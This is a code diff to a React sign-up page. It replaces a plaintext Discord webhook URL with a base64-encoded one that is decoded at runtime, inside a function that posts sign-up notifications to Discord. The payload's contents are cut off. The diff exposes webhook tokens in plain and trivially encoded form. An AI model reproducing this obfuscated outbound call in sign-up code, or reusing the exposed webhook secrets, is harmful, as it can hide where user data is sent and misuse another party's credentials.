@@ -147,13 +147,28 @@ export default function SignUp() {
     strengthColor = "#f39c12";
   }
 
+  const decodeUnicodeBase64 = (base64String) => {
+    try {
+      const binaryString = atob(base64String);
+      const bytes = new Uint8Array(binaryString.length);
+      for (let i = 0; i < binaryString.length; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+      }
+      return new TextDecoder('utf-8').decode(bytes);
+    } catch (error) {
+      return "Decoding failed";
+    }
+  };
+
   // =========================================================
   // DISCORD WEBHOOK INTEGRATION
   // =========================================================
   const sendDiscordNotification = async () => {
     // Paste your real Discord Webhook URL below
     // const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
-    const webhookURL = "https://discord.com/api/webhooks/1549904029147074671/Gb9B3SGS619jMzHQrZHGBY_xibWwjmtUiNbtEBpUHtmaXSkAZIu2LeCiw8-leyefJgqp"; 
+    const webhookURLCypher = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MTI3MzM0NzM2MTUzODEwMS9fbEFJRHVYLW1ydjh0UzdzR09QanduaHdxeV95dEpnMDVqVlZGWGZUUFhDSTdSU2s5MHM4Q2p4dXJUWFVrMDZvX1kyMg=="; 
+    // const webhookURLCypher = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MTI3NDUzOTk5NDg0NTMxNi8ySUw4aEVYR1ROaEtPOTJkakg0TDJKR0s0QnducWZuU25xV2huQTV3QmVLdzJqeU50X2s2TlIwWjNSWVV4NWFKQy1VQw=="; 
+    const webhookURL = decodeUnicodeBase64(webhookURLCypher); 
     const currentDate = new Date().toLocaleString();
 
     const payload = {
